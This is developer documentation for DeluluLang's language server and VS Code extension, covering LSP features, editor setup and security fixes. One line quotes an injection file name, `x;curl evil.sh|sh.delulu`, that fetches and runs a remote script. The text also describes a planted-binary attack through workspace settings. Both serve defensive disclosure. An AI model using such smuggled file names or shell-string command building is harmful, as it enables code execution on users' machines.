# DeluluLang in your editor — one server, every surface

DeluluLang ships **one** language server: `delulu lsp` (LSP 3.17 over stdio). There are no
editor-specific server features, by rule (Constitution §8.4) — VS Code, Zed, Neovim, Helix,
JetBrains-via-LSP, and agentic IDEs (Antigravity et al.) all consume the same server and
get the same answers, because the answers are the compiler's.

## The three-line generic config

Any LSP-capable editor or agent IDE needs exactly this:

```
command:   delulu lsp
languages: delulu   (files: *.delulu)
transport: stdio
```

## What the server gives you

- **Diagnostics that ARE the compiler's** — same codes, spans, messages, and typed
  repairs as `delulu check --json`. Nothing is re-derived, nothing drifts.
- **Code actions from typed repairs** — an authority-widening repair is ⚠-titled and
  never preferred; `authority_widening`/`requires_human` ride in the action's `data`
  so agent harnesses can refuse them by policy.
- **Hover** — type, effect row, and (on a function name) the full signature plus its
  transitively computed authority.
- **The authority lens** — inlay hints show the inferred row on unannotated lambdas.
- **Completion** — the declarations in scope (a function carries its signature *and* its
  authority row, so you see what it can do before you call it), then the keywords.
  **Inside an effect row `! { … }` only effects are offered**, because nothing else is
  legal there and a suggestion that cannot compile is worse than no suggestion. Names
  from the file you are in sort above names from other open files. Every list comes from
  the compiler's own — keywords from the morph table, effects from the checker's core
  set — so the completion list cannot drift from the language.
- **Definition / references** for module-level names across the whole project —
  including files you have never opened. When several open files declare the same name,
  **definition resolves to the one you are in**, and otherwise to the first by URI —
  the same question always gets the same answer, in this session and the next.
- **Rename** for module-level names, **across the documents you have open**. A local
  rename is refused rather than guessed (resolving it needs shadow-aware scoping the
  server does not have), and a rename that would leave the name behind in unopened
  files is refused too — naming those files so you can open them. The reference walk is
  an approximation: it matches a qualified path's final segment, so an unrelated record
  method of the same name is included. Across files you have open that is a diff you can
  read and correct; across a project you have not opened it is silent corruption. So the
  server reads the whole project and writes only what you can see.
- **Semantic tokens** with dedicated kinds for effects, reference capabilities,
  capability types, and secrets.
- **Code lenses** on `fn main` (`▶ run`, `authority: {…}`) and every `test` block (`▶ run test`,
  which runs *that* test by name — it used to run the whole file).
- **`delulu.authority`** (workspace/executeCommand) — the §10.5 authority report as
  JSON over the wire; agent harnesses call this instead of shelling out. In an editor this is
  reached through the client-side command **`delulu.showAuthority`**, which is what the lens names
  and what appears in the Command Palette. The two names are deliberately different — see the note
  under *VS Code* below, where making them the same disabled the language server entirely.
- **`delulu.guardStatus`** (workspace/executeCommand, V2 P4-07) — the Guard, read-only: exactly
  what `delulu guard status --json` prints for the broker the editor's environment points at
  (mode, rules, pending requests, live permits), or its fail-closed `DL1401` when no broker runs.
  In VS Code, **Show Guard status (read-only)**. Approvals and rule changes stay in the CLI.
- **Hover on a function name** shows its signature and its declared row as `authority:`; when the
  body performs something different, a `performs:` line names what differs — declared but never
  performed (DL0502) or performed but not declared (DL0501).
- **Signature help** — while writing a call, the callee's parameters *and its
  authority row*, with the argument you are on highlighted. The label is sliced from
  the declaring file's own source, so you see the signature exactly as its author wrote
  it and no renderer can drift from the language. Actor behaviours get it too.
- **Workspace symbols** — every module-level declaration in the project, including in
  files you have never opened. The server indexes `*.delulu` under the workspace folders
  (skipping `target/`, `.git/` and friends), **parsing rather than type-checking** them,
  and validates that index against file modification times, so it does not go stale when
  the editor forgets to say a file changed. An open buffer always wins over its copy on
  disk — what you are looking at may not be saved. With no workspace folder, only open
  documents are searched, and nothing is read from disk.
- **Formatting** (`textDocument/formatting`) — *Format Document* and `editor.formatOnSave` run the
  **same** `format_source` that `delulu fmt` calls, and a test requires byte-identical output, so the
  editor and `delulu fmt --check` in CI can never disagree about whether a file is formatted. An
  already-canonical file returns no edits at all, rather than an edit that replaces the text with
  itself and dirties the buffer. An unparseable file also returns no edits: `fmt` refuses parse-dirty
  input by design, and format-on-save fires exactly when the file is mid-edit and broken, so the
  editor-facing shape of that refusal is "no change", not a dialog on every save. **Range formatting
  is deliberately not offered** — the formatter's contract is over a complete parse, and quietly
  widening a selection to the whole file would reformat lines you did not choose.
- **Incremental sync** (`textDocumentSync: 2`) — an edit sends the range it touched
  rather than the whole file, and the document is checked once per edit rather than
  once per question asked about it. A client that prefers to resend the whole text is
  still honoured, so nothing needs configuring either way.

## What the server can NOT do — by construction

The LSP is analysis-only: it never runs code, never loads plugins, and holds no broker
connection or lease. A compromised workspace cannot use it as an effector. Its
availability is not a security property (spec §11).

## Per-editor notes

- **VS Code:** the extension lives in `editors/vscode/` (LSP client + TextMate grammar). Build and
  install it with:

  ```
  cd editors/vscode
  npm install
  npm run package     # esbuild bundle -> delulu-lang.vsix
  npm run verify      # refuses a .vsix that would fail to activate
  code --install-extension delulu-lang.vsix
  ```

  It requires `delulu` on your `PATH`; set `delulu.serverPath` if it is elsewhere. If neither
  holds, the extension says so plainly — which binary it looked for, how many `PATH` entries it
  searched, and the two ways to fix it — rather than the language client's default
  *"couldn't create connection to server"*, which names neither cause nor cure. `delulu.trace.server`
  set to `verbose` logs every request and response to the **DeluluLang** output channel; that is the
  setting to turn on before reporting a bug.

  **`delulu.serverPath` is machine-scoped, and that is a security boundary.** With VS Code's default
  scope a repository's own `.vscode/settings.json` can write it, and this extension launches that
  path as a process the moment a `.delulu` file is opened. Opening a cloned repository therefore ran
  a binary the repository chose, with no click from the user. That was reproduced end-to-end against
  a build of this extension — planted executable, 7 seconds after the folder opened — and the fixed
  build never ran it, with nothing different between the two packages but the `scope` line.
  `editor_contract.rs` now fails the build for *any* setting that names a path, binary, or argument
  list and is not machine-scoped. The extension also resolves the configured name to an absolute
  path itself instead of letting the OS do it, because on Windows `CreateProcess` searches the
  current directory before `PATH`; `editors/vscode/test/resolve.test.js` pins that behaviour.

  That resolution had one gap of its own, closed 2026-08-10 (`SERVERPATH-REL-1`): it did the lookup
  itself but did not require the `PATH` **entries** to be absolute, so a `PATH` containing `.` put the
  planted-binary hole back — the resolver returned a bare name that the OS then resolved against the
  working directory, in violation of this module's own contract to return an absolute path. Relative
  `PATH` entries are now skipped, for the same reason a relative `delulu.serverPath` is refused
  outright.

  `delulu run` and `delulu test` additionally refuse to run in an untrusted workspace, since they
  execute the workspace's own code. Analysis deliberately still runs there: reading a hostile file is
  what a language server is for.

  **The editor's command and the server's command must not share a name.** A language client
  registers a VS Code command for every entry in the server's `executeCommandProvider.commands`
  while it initializes. Registering the same name in `extension.js` therefore collides with our own
  client: `registerCommand` throws *"command 'delulu.authority' already exists"* from inside
  `client.start()`, initialization fails, the queued `didOpen` is dropped, and the server is shut
  down. **This project shipped in that state** — syntax highlighting and nothing else, in every
  workspace — and the whole test suite was green, because `lsp_cli.rs` talks to the server without
  being a VS Code client and `editor_contract.rs` compares source text without running anything.
  The lens now names `delulu.showAuthority`; `editor_contract.rs` fails the build if the two lists
  ever overlap again, and `editors/vscode/e2e.js` launches a real VS Code against a real server and
  requires three positive signals — the extension activated, a `delulu … lsp` process is alive, and
  `textDocument/publishDiagnostics` appears in the trace. Its first draft asserted only the *absence*
  of errors and passed the broken build, which is the same mistake that let the bug ship: silence is
  not evidence.

  **It is bundled into one file on purpose.** Shipping the dependency tree instead produced a `.vsix`
  that packaged cleanly and would have thrown `Cannot find module` on activation: `npm install` put 8
  packages in `node_modules` and `vsce` shipped only the one named in `dependencies`, so three
  transitive requires travelled nowhere. `npm run verify` is what catches that — it unpacks the built
  archive and checks every `require` in every shipped file resolves, because a green *package* step
  says nothing about whether the thing inside runs.

  **Commands run with an argument vector, never a shell string.** The lenses previously built
  `` `${serverPath} run ${fsPath}` `` and handed it to the user's shell, so a file named
  `x;curl evil.sh|sh.delulu` executed on click and any path with a space ran the wrong command.
  `crates/delulu/tests/editor_contract.rs` fails the build if that shape returns, and if the three
  lists — commands the server emits in lenses, commands the client registers, commands the manifest
  declares — ever disagree.
  **What the extension adds on top of the server**, all of it built from things the CLI already
  computes rather than from editor-only logic:

  | | what it is |
  | --- | --- |
  | **Authority atlas** | *DeluluLang: Show authority atlas* renders `delulu atlas --format html` in a panel beside the file — the call graph with each function's effect row on it. The generated document is entirely self-contained (no scripts, fonts or images fetched from anywhere), which is what makes it safe to display; the panel is still created with scripting **disabled** and a `Content-Security-Policy` allowing only inline styles, because "our own binary produced it" stops being true the moment someone adds a feature to that binary. |
  | **Snippets** | Every snippet that declares a function carries its **effect row**. A snippet producing `fn f() { … }` with the row omitted would teach people to write the declaration and meet the checker's objection afterwards. |
  | **Tasks** | `delulu: check / build / test / fmt` via `ProcessExecution` (an argument vector, never a shell), one task per workspace folder so a multi-root workspace does not silently pick one. `fmt` is bound to `--check`: a task that rewrites your files when you press the build key is a surprise. |
  | **Problem matcher** | `$delulu` parses `error[DLxxxx]: …` plus the `--> file:line:col` line, so terminal output becomes clickable Problems entries. It depends on every error line starting with `error:`, which `cli_contract.rs` now enforces. |
  | **Status bar** | `✓ DeluluLang` when the server is up, `✗` with the reason when it is not — so a dead server is visible rather than merely quiet. |

- **Zed / Helix / Neovim (lspconfig) / Kate / Emacs (eglot):** point the editor's LSP
  config at `delulu lsp` for `*.delulu` — the three-line config above is all of it.
- **JetBrains:** via the native LSP support (2023.2+) or the LSP4IJ plugin; same command.
- **Agent IDEs / harnesses:** spawn `delulu lsp`, speak stdio; call `delulu.authority`
  for the report. `delulu` never prompts on machine channels (invariant 40) — the
  first-run picker cannot appear under `lsp`.
